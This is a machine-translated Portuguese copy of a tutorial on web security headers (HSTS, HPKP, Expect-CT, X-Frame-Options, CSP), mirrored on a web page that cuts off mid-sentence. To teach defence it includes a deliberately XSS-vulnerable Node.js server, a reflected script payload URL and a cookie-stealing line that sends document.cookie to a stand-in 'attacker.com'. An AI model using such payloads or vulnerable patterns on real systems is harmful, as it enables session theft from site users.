<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üî≤ üë®‚Äçüë®‚Äçüëß‚Äçüëß ‚ôãÔ∏è Como refor√ßar a seguran√ßa de aplicativos da Web com cabe√ßalhos HTTP üèáüèΩ üë©üèø‚Äçüéì ü¶ñ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Esta √© a terceira parte da s√©rie de seguran√ßa da Web: a segunda parte foi " Seguran√ßa na Web: Uma Introdu√ß√£o ao HTTP " , a primeira " Como os Navegado...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Como refor√ßar a seguran√ßa de aplicativos da Web com cabe√ßalhos HTTP</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/edison/blog/434228/"><img src="https://habrastorage.org/getpro/habr/post_images/c8d/5c5/809/c8d5c5809e609fecf60c662139f248d2.jpg" alt="imagem"><br><br>  Esta √© a terceira parte da s√©rie de seguran√ßa da Web: a segunda parte foi " <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Seguran√ßa na Web: Uma Introdu√ß√£o ao HTTP</a> " <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">,</a> a primeira " <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Como os Navegadores Funcionam - Uma Introdu√ß√£o √† Seguran√ßa de Aplicativos da Web</a> ". <br><br>  Como vimos nas partes anteriores desta s√©rie, os servidores podem enviar cabe√ßalhos HTTP para fornecer ao cliente metadados adicionais na resposta, al√©m de enviar o conte√∫do solicitado pelo cliente.  Os clientes t√™m permiss√£o para especificar como ler, armazenar em cache ou proteger um recurso espec√≠fico. <br><br>  Agora, os navegadores implementaram uma gama muito ampla de cabe√ßalhos relacionados √† seguran√ßa para dificultar a explora√ß√£o de vulnerabilidades por invasores.  Neste artigo, tentaremos discutir cada um deles, explicando como s√£o usados, quais ataques eles impedem e um pouco de hist√≥rico para cada cabe√ßalho. <br><a name="habracut"></a><br><blockquote> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" title="EDISON Software - desenvolvimento web"><img align="left" width="153" height="75" src="https://habrastorage.org/webt/w0/zl/to/w0zltoxvysbr0yeinstkfvw1wbg.png" alt="EDISON Software - desenvolvimento web"></a> <br clear="right">  O post foi escrito com o apoio da EDISON Software, que <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">luta pela honra dos programadores russos</a> e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">compartilha</a> em detalhes <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">sua experi√™ncia no desenvolvimento de produtos de software complexos</a> . </blockquote><h3>  Seguran√ßa de transporte restrito HTTP (HSTS) </h3><br>  Desde o final de 2012, tornou-se mais f√°cil para os apoiadores do HTTPS Everywhere fazer com que o cliente sempre use a vers√£o segura do protocolo HTTP, gra√ßas ao Strict Transport Security: a linha muito simples <code>Strict-Transport-Security: max-age=3600</code> informar√° o navegador que dentro de uma hora (3600 segundos) ele n√£o deve interagir com o aplicativo por meio de protocolos inseguros. <br><br>  Quando um usu√°rio tenta acessar um aplicativo protegido pelo HSTS via HTTP, o navegador simplesmente se recusa a ir al√©m, convertendo automaticamente os URLs <code>http://</code> em <code>https://</code> . <br><br>  Voc√™ pode verificar isso localmente com o c√≥digo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">github.com/odino/wasec/tree/master/hsts</a> .  Voc√™ precisar√° seguir as instru√ß√µes no README (inclui a instala√ß√£o de um certificado SSL confi√°vel para <code>localhost</code> no seu computador usando a ferramenta <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">mkcert</a> ) e, em seguida, tente abrir <code>https://localhost:7889</code> . <br><br>  Neste exemplo, existem 2 servidores: HTTPS, que est√° atendendo no <code>7889</code> e HTTP, na porta <code>7888</code> .  Quando voc√™ acessa um servidor HTTPS, ele sempre tenta redirecion√°-lo para uma vers√£o HTTP que funcionar√° porque o HSTS n√£o est√° dispon√≠vel no servidor HTTPS.  Se voc√™ adicionar o par√¢metro <code>hsts=on</code> √† sua URL, o navegador converter√° for√ßosamente o link para a vers√£o <code>https://</code> .  Como o servidor no <code>7888</code> s√≥ pode ser acessado pelo protocolo http, voc√™ acabar√° vendo uma p√°gina parecida com esta. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/693/783/9e0/6937839e0473a7101847dfaba7a10a1d.png" alt="imagem"><br><br>  Voc√™ pode estar interessado em saber o que acontece quando um usu√°rio visita seu site pela primeira vez, porque a pol√≠tica HSTS n√£o √© predefinida: os invasores podem enganar o usu√°rio na vers√£o <code>http://</code> do seu site e realizar um ataque l√°, para que ainda haja problemas. .  Esse √© um problema s√©rio, porque o HSTS √© um mecanismo de confian√ßa no primeiro uso.  Ele tenta garantir que, depois de visitar o site, o navegador saiba que o HTTPS deve ser usado nas intera√ß√µes subsequentes. <br><br>  Uma solu√ß√£o alternativa para isso poderia ser a manuten√ß√£o de um enorme banco de dados de sites compat√≠veis com HSTS, o que o Chrome faz por meio do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">hstspreload.org</a> .  Voc√™ deve primeiro estabelecer sua pol√≠tica e, em seguida, visitar o site e verificar se ele pode ser adicionado ao banco de dados.  Por exemplo, podemos ver que o Facebook est√° na lista. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/6ce/40b/830/6ce40b8307fa218f0f6f5f8cb3ccdad9.png" alt="imagem"><br><br>  Ao enviar seu site para esta lista, voc√™ pode informar com anteced√™ncia aos navegadores que seu site usa HSTS, para que at√© a primeira intera√ß√£o entre clientes e seu servidor seja realizada por um canal seguro.  Mas √© caro, pois voc√™ realmente precisa participar do HSTS.  Se, por qualquer motivo, voc√™ desejar que seu site seja removido da lista, essa n√£o √© uma tarefa f√°cil para os provedores de navegadores: <br><blockquote>  Lembre-se de que a inclus√£o na lista de pr√©-carregamento n√£o pode ser facilmente cancelada. <br><br>  Os dom√≠nios podem ser exclu√≠dos, mas leva meses para que o Chrome seja atualizado para os usu√°rios, e n√£o podemos garantir outros navegadores.  N√£o solicite a inclus√£o na lista se n√£o tiver certeza de que pode oferecer suporte a HTTPS para todo o site e todos os seus subdom√≠nios por um longo tempo. <br>  - Fonte: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">https://hstspreload.org/</a> </blockquote>  Isso ocorre porque o provedor n√£o pode garantir que todos os usu√°rios usem a vers√£o mais recente do navegador e que o site ser√° removido da lista.  Pense com cuidado e tome uma decis√£o com base no seu grau de confian√ßa no HSTS e na sua capacidade de apoi√°-lo a longo prazo. <br><br><h3>  Fixa√ß√£o de chave p√∫blica HTTP (HPKP) </h3><br>  A Fixa√ß√£o de Chave P√∫blica HTTP √© um mecanismo que nos permite dizer ao navegador quais certificados SSL esperar ao se conectar aos nossos servidores.  Esse cabe√ßalho usa o mecanismo de confian√ßa no primeiro uso, como o HSTS, e significa que, depois que o cliente se conectar ao nosso servidor, ele armazenar√° informa√ß√µes de certificado para intera√ß√µes subseq√ºentes.  Se, em algum momento, o cliente descobrir que o servidor est√° usando um certificado diferente, ele se recusar√° educadamente a se conectar, o que dificultar√° a execu√ß√£o de ataques "man in the middle" (MITM). <br><br>  Veja como √© a pol√≠tica do HPKP: <br><br><pre> <code class="plaintext hljs">Public-Key-Pins: pin-sha256="9yw7rfw9f4hu9eho4fhh4uifh4ifhiu="; pin-sha256="cwi87y89f4fh4fihi9fhi4hvhuh3du3="; max-age=3600; includeSubDomains; report-uri="https://pkpviolations.example.org/collect"</code> </pre> <br>  O cabe√ßalho anuncia quais certificados o servidor usar√° (nesse caso, dois deles) usando o hash do certificado e inclui informa√ß√µes adicionais, como o tempo de vida desta diretiva ( <code>max-age = 3600</code> ) e v√°rios outros detalhes.  Infelizmente, n√£o faz sentido ir mais fundo para entender o que podemos fazer para proteger a chave p√∫blica, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">porque o Chrome n√£o aprova esse recurso</a> - um sinal de que sua ado√ß√£o est√° fadada ao fracasso. <br><br>  A solu√ß√£o do Chrome n√£o √© irracional, √© apenas uma consequ√™ncia dos riscos associados √† seguran√ßa da chave p√∫blica.  Se voc√™ perder seu certificado ou simplesmente cometer um erro durante o teste, seu site ficar√° indispon√≠vel para os usu√°rios que o visitaram anteriormente (durante o per√≠odo de validade da diretiva de <code>max-age</code> , que geralmente √© semanas ou meses). <br><br>  Como resultado dessas conseq√º√™ncias potencialmente catastr√≥ficas, a ado√ß√£o do HPKP foi extremamente baixa e houve momentos <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">em que grandes sites n√£o estavam dispon√≠veis devido √† configura√ß√£o incorreta</a> .  Diante de tudo isso, o Chrome decidiu que os usu√°rios estariam melhor sem a prote√ß√£o oferecida pelo HPKP, e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">os pesquisadores de seguran√ßa n√£o se op√µem completamente a essa decis√£o</a> . <br><br><h3>  Expect-CT </h3><br>  Enquanto o HPKP estava reprovando, um novo cabe√ßalho apareceu para evitar certificados SSL fraudulentos para clientes: <code>Expect-CT</code> . <br><br>  O objetivo desse cabe√ßalho √© informar ao navegador que ele precisa executar "verifica√ß√µes em segundo plano" adicionais para verificar se o certificado √© aut√™ntico: quando o servidor usa o cabe√ßalho <code>Expect-CT</code> , basicamente solicita ao cliente que verifique se os certificados usados ‚Äã‚Äãest√£o nos logs de certificado de transpar√™ncia aberta (CT). <br><br>  Iniciativa de transpar√™ncia de certificado s√£o os esfor√ßos do Google para garantir: <br><blockquote>  Uma plataforma aberta para monitorar e auditar certificados SSL quase em tempo real. <br><br>  Em particular, a transpar√™ncia do certificado permite detectar certificados SSL que foram emitidos erroneamente por uma autoridade de certifica√ß√£o ou obtidos maliciosamente de outra autoridade de certifica√ß√£o sem falhas.  Tamb√©m permite identificar autoridades de certifica√ß√£o que cometeram fraude e emitem certificados com c√≥digos maliciosos. <br>  - Fonte: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">https://www.certificate-transparency.org/</a> </blockquote>  O cabe√ßalho assume este formato: <br><br><pre> <code class="plaintext hljs">Expect-CT: max-age=3600, enforce, report-uri="https://ct.example.com/report"</code> </pre> <br>  Neste exemplo, o servidor pergunta ao navegador: <br><br><ul><li>  habilitar a verifica√ß√£o CT para a aplica√ß√£o atual por um per√≠odo de 1 hora (3600 segundos) </li><li>  <code>enforce</code> impor esta pol√≠tica e negar acesso ao aplicativo em caso de viola√ß√£o </li><li>  envie um relat√≥rio para o URL especificado em caso de viola√ß√£o </li></ul><br>  O objetivo da iniciativa de Transpar√™ncia de Certificados √© detectar certificados maliciosos ou emitidos erroneamente (e autoridades de certifica√ß√£o fraudulentas) antes, de forma mais r√°pida e precisa do que qualquer outro m√©todo usado anteriormente. <br><br>  Ao ativar o uso do cabe√ßalho <code>Expect-CT</code> , voc√™ pode tomar esta iniciativa para melhorar o estado de seguran√ßa do seu aplicativo. <br><br><h3>  Op√ß√µes de quadro X </h3><br>  Imagine que voc√™ v√™ uma p√°gina da web como esta <br><br><img src="https://habrastorage.org/getpro/habr/post_images/2f5/87f/f15/2f587ff15a4e613cc91e13122d49e22b.png" alt="imagem"><br><br>  Assim que voc√™ clica no link, entende que todo o dinheiro da sua conta banc√°ria desapareceu.  O que aconteceu <br><br>  Voc√™ foi v√≠tima de um ataque de clickjacking. <br><br>  Um invasor o direcionou para o site dele, que exibe um link de clique muito atraente.  Infelizmente, ele tamb√©m incorporou a p√°gina iframe com <code>your-bank.com/transfer?amount=-1&amp;[attacker@gmail.com]</code> , mas a ocultou definindo a transpar√™ncia como 0%.  Pensamos que clicamos na p√°gina original, tentando ganhar um hamer completamente novo, mas o navegador corrigiu um clique no iframe, um clique perigoso que confirmou a transfer√™ncia de dinheiro. <br><br>  A maioria dos sistemas banc√°rios exige que voc√™ forne√ßa um PIN √∫nico para confirmar as transa√ß√µes, mas seu banco n√£o alcan√ßou o tempo e todo o seu dinheiro foi perdido. <br><br>  O exemplo √© bastante extremo, mas deve fazer voc√™ entender quais podem ser as consequ√™ncias de um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">ataque usando o clickjacking</a> .  O usu√°rio pretende clicar em um link espec√≠fico, enquanto o navegador far√° um clique na p√°gina "invis√≠vel", que foi incorporada como um quadro. <br><br>  Eu inclu√≠ um exemplo dessa vulnerabilidade no <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">github.com/odino/wasec/tree/master/clickjacking</a> .  Se voc√™ executar o exemplo e tentar clicar no link "atraente", ver√° que o clique real √© interceptado pelo iframe, o que o torna n√£o transparente, tornando mais f√°cil a detec√ß√£o do problema.  Um exemplo deve estar dispon√≠vel em <code><a href="">http://localhost:7888</a></code> . <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e11/a28/3a9/e11a283a9d4f69c80622666fdcc647c2.png" alt="imagem"><br><br>  Felizmente, os navegadores encontraram uma solu√ß√£o simples para esse problema: <code>X-Frame-Options</code> (XFO), que permite que voc√™ decida se seu aplicativo pode ser incorporado como iframes em sites externos.  Popularizado pelo Internet Explorer 8, o XFO foi introduzido pela primeira vez em 2009 e ainda √© suportado por todos os principais navegadores. <br><br>  Funciona assim: quando o navegador v√™ um iframe, ele o carrega e verifica se seu XFO permite que ele seja inclu√≠do na p√°gina atual antes de renderiz√°-lo. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/8c3/61e/04e/8c361e04e5a18bac008a106e47090dc1.png" alt="imagem"><br><br>  Valores suportados: <br><br><ul><li>  <code>DENY</code> : esta p√°gina da web n√£o pode ser incorporada em nenhum lugar.  Esse √© o n√≠vel mais alto de prote√ß√£o, pois n√£o permite que ningu√©m incorpore nosso conte√∫do. </li><li>  <code>SAMEORIGIN</code> : Somente p√°ginas do mesmo dom√≠nio que o atual podem inserir esta p√°gina.  Isso significa que <code>example.com/embedder</code> pode carregar <code>example.com/embedded</code> se sua pol√≠tica estiver definida como <code>SAMEORIGIN</code> .  Essa √© uma pol√≠tica mais calma que permite que os propriet√°rios de um site espec√≠fico incorporem suas pr√≥prias p√°ginas em seu aplicativo. </li><li>  <code>ALLOW-FROM uri</code> : anexo permitido a partir do URI especificado.  Podemos, por exemplo, permitir que um site externo autorizado incorpore nosso conte√∫do usando <code>ALLOW-FROM https://external.com</code> .  Isso geralmente √© usado quando voc√™ permite que desenvolvedores de terceiros incorporem seu conte√∫do por meio de um iframe. </li></ul><br>  Um exemplo de resposta HTTP que inclui a pol√≠tica XFO mais estrita poss√≠vel √© a seguinte: <br><br><pre> <code class="plaintext hljs">HTTP/1.1 200 OK Content-Type: application/json X-Frame-Options: DENY ...</code> </pre> <br>  Para demonstrar como os navegadores se comportam quando o XFO est√° ativado, podemos simplesmente alterar nosso URL de exemplo para <code>http://localhost:7888 /?xfo=on</code> .  O par√¢metro <code>xfo=on</code> diz ao servidor para incluir <code>X-Frame-Options: deny</code> na resposta, e podemos ver como o navegador restringe o acesso ao iframe: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ecf/751/7b7/ecf7517b7954476cacc64a7e3cb38d87.png" alt="imagem"><br><br>  O XFO foi considerado a melhor maneira de impedir ataques baseados em cliques com base em quadros at√© que, ap√≥s alguns anos, outro t√≠tulo entrou em jogo - Pol√≠tica de Seguran√ßa de Conte√∫do ou CSP, abreviado. <br><br><h3>  Pol√≠tica de Seguran√ßa de Conte√∫do (CSP) </h3><br>  O cabe√ßalho <code>Content-Security-Policy</code> , CSP abreviado, fornece utilit√°rios de √∫ltima gera√ß√£o para evitar uma variedade de ataques, desde XSS (scripts entre sites) at√© intercepta√ß√£o de cliques (click-jacking). <br><br>  Para entender como o CSP nos ajuda, primeiro voc√™ precisa pensar em um vetor de ataque.  Digamos que acabamos de criar nosso pr√≥prio mecanismo de pesquisa do Google, onde h√° um campo de entrada simples com um bot√£o de envio. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e92/afc/397/e92afc3972e0d40182d68544e8e51d5c.png" alt="imagem"><br><br>  Esta aplica√ß√£o web n√£o faz nada de m√°gico.  √â simples <br><br><ul><li>  exibe formul√°rio </li><li>  permite ao usu√°rio pesquisar </li><li>  exibe os resultados da pesquisa junto com a palavra-chave pesquisada pelo usu√°rio </li></ul><br>  Quando realizamos uma pesquisa simples, o aplicativo retorna o seguinte: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/5a7/977/79b/5a797779b4394913cbfef82a6e0dafe9.png" alt="imagem"><br><br>  Incr√≠vel  Nosso aplicativo entendeu incrivelmente nossa pesquisa e encontrou uma imagem semelhante.  Se nos aprofundarmos no c√≥digo fonte dispon√≠vel em <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">github.com/odino/wasec/tree/master/xss</a> , em breve perceberemos que o aplicativo apresenta um problema de seguran√ßa, pois qualquer palavra-chave pesquisada por um usu√°rio √© impressa diretamente em HTML: <br><br><pre> <code class="xml hljs">var qs = require('querystring') var url = require('url') var fs = require('fs') require('http').createServer((req, res) =&gt; { let query = qs.parse(url.parse(req.url).query) let keyword = query.search || '' let results = keyword ? `You searched for "${keyword}", we found:<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">br</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">img</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://placekitten.com/200/300"</span></span></span><span class="hljs-tag"> /&gt;</span></span>` : `Try searching...` res.end(fs.readFileSync(__dirname + '/index.html').toString().replace('__KEYWORD__', keyword).replace('__RESULTS__', results)) }).listen(7888) <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span>Search The Web<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"search"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"__KEYWORD__"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"submit"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"results"</span></span></span><span class="hljs-tag">&gt;</span></span> __RESULTS__ <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  Esta √© uma consequ√™ncia desagrad√°vel.  Um invasor pode criar um link espec√≠fico que executa JavaScript arbitr√°rio no navegador da v√≠tima. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/3ee/628/c3a/3ee628c3af5ea6176284c5451423957c.png" alt="imagem"><br><br>  Se voc√™ tiver tempo e paci√™ncia para executar o exemplo localmente, poder√° entender rapidamente todo o poder do CSP.  Adicionei um par√¢metro de string de consulta que inclui o CSP, para que possamos tentar mudar para um URL malicioso com o CSP ativado: <br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">localhost</a> : 7888 /? search =% 3Cscript + tipo% 3D 3D% 22text% 2Fjavascript% 22% 3 Alerta% 28% 27Voc√™% 20 tem% 20be% 20PWNED% 27% 29% 3C% 2Fscript% 3E &amp; csp = ativado </blockquote><img src="https://habrastorage.org/getpro/habr/post_images/903/763/6a1/9037636a1b4baa19cced586860caa993.png" alt="imagem"><br><br>  Como voc√™ pode ver no exemplo acima, informamos ao navegador que nossa pol√≠tica de CSP permite apenas scripts inclu√≠dos na mesma fonte da URL atual, que podemos verificar facilmente acessando a URL usando curl e observando o cabe√ßalho de resposta: <br><br><pre> <code class="plaintext hljs">$ curl -I "http://localhost:7888/?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E&amp;csp=on" HTTP/1.1 200 OK X-XSS-Protection: 0 Content-Security-Policy: default-src 'self' Date: Sat, 11 Aug 2018 10:46:27 GMT Connection: keep-alive</code> </pre> <br>  Como o ataque XSS foi realizado usando um script incorporado (um script incorporado diretamente no conte√∫do HTML), o navegador recusou educadamente execut√°-lo, garantindo a seguran√ßa de nosso usu√°rio.  Imagine que, em vez de apenas exibir uma caixa de di√°logo de aviso, um invasor configure um redirecionamento para seu pr√≥prio dom√≠nio por meio de algum c√≥digo JavaScript, que pode ser assim: <br><br><pre> <code class="plaintext hljs">window.location = `attacker.com/${document.cookie}`</code> </pre> <br>  Eles podem roubar todos os cookies do usu√°rio, que podem conter dados muito confidenciais (mais sobre isso no pr√≥ximo artigo). <br><br>  At√© agora, deve ficar claro como o CSP nos ajuda a impedir v√°rios ataques a aplicativos da web.  Voc√™ define uma pol√≠tica e o navegador segue rigorosamente a mesma, recusando-se a executar recursos que violem a pol√≠tica. <br><br>  Uma op√ß√£o interessante para o CSP √© o modo somente relat√≥rio.  Em vez de usar o cabe√ßalho <code>Content-Security-Policy</code> , voc√™ pode primeiro verificar o efeito do CSP no seu site, dizendo ao navegador para simplesmente relatar erros sem bloquear a execu√ß√£o do script, etc. Usando o cabe√ßalho <code>Content-Security-Policy-Report-Only</code> . <br><br>  Os relat√≥rios permitir√£o entender quais altera√ß√µes cr√≠ticas podem ser causadas pela pol√≠tica de CSP que voc√™ deseja implantar e corrigi-las de acordo.  Podemos at√© fornecer o URL do relat√≥rio e o navegador nos enviar√° o relat√≥rio.  Aqui est√° um exemplo completo de pol√≠tica somente para relat√≥rio: <br><br><pre> <code class="plaintext hljs">Content-Security-Policy: default-src 'self'; report-uri http://cspviolations.example.com/collector</code> </pre> <br>  As pr√≥prias pol√≠ticas de CSP podem ser um pouco complicadas, por exemplo, no exemplo a seguir: <br><br><pre> <code class="plaintext hljs">Content-Security-Policy: default-src 'self'; script-src scripts.example.com; img-src *; media-src medias.example.com medias.legacy.example.com</code> </pre> <br>  Esta pol√≠tica define as seguintes regras: <br><br><ul><li>  scripts execut√°veis ‚Äã‚Äã(por exemplo, JavaScript) podem ser baixados apenas de <code>scripts.example.com</code> </li><li>  As imagens podem ser baixadas de qualquer fonte ( <code>img-src: *</code> ) </li><li>  o conte√∫do do v√≠deo ou do √°udio pode ser baixado de duas fontes: <code>medias.example.com</code> e <code>medias.legacy.example.com</code> </li></ul><br>  Como voc√™ pode ver, pode haver muitos pol√≠ticos e, se queremos oferecer a m√°xima prote√ß√£o aos nossos usu√°rios, esse pode ser um processo bastante tedioso.  No entanto, escrever uma pol√≠tica abrangente de CSP √© um passo importante para adicionar uma camada extra de seguran√ßa aos nossos aplicativos da web. <br><br>  Para mais informa√ß√µes sobre CSP, eu recomendaria <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a> . <br><br><h3>  Prote√ß√£o X-XSS </h3><br>  Embora substitu√≠do pelo CSP, o cabe√ßalho <code>X-XSS-Protection</code> fornece o mesmo tipo de prote√ß√£o.  Esse cabe√ßalho √© usado para mitigar ataques XSS em navegadores mais antigos que n√£o oferecem suporte completo ao CSP.  Este cabe√ßalho n√£o √© suportado pelo Firefox. <br><br>  Sua sintaxe √© muito semelhante ao que acabamos de ver: <br><br><pre> <code class="plaintext hljs">X-XSS-Protection: 1; report=http://xssviolations.example.com/collector</code> </pre> <br>  XSS refletido √© o tipo mais comum de ataque quando o texto digitado √© impresso pelo servidor sem nenhuma verifica√ß√£o, e √© a√≠ que esse cabe√ßalho realmente resolve.  Se voc√™ quiser ver por si mesmo, recomendo tentar o exemplo em <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">github.com/odino/wasec/tree/master/xss</a> , pois adicionando <code>xss=on</code> ao URL, ele mostra o que o navegador faz quando a 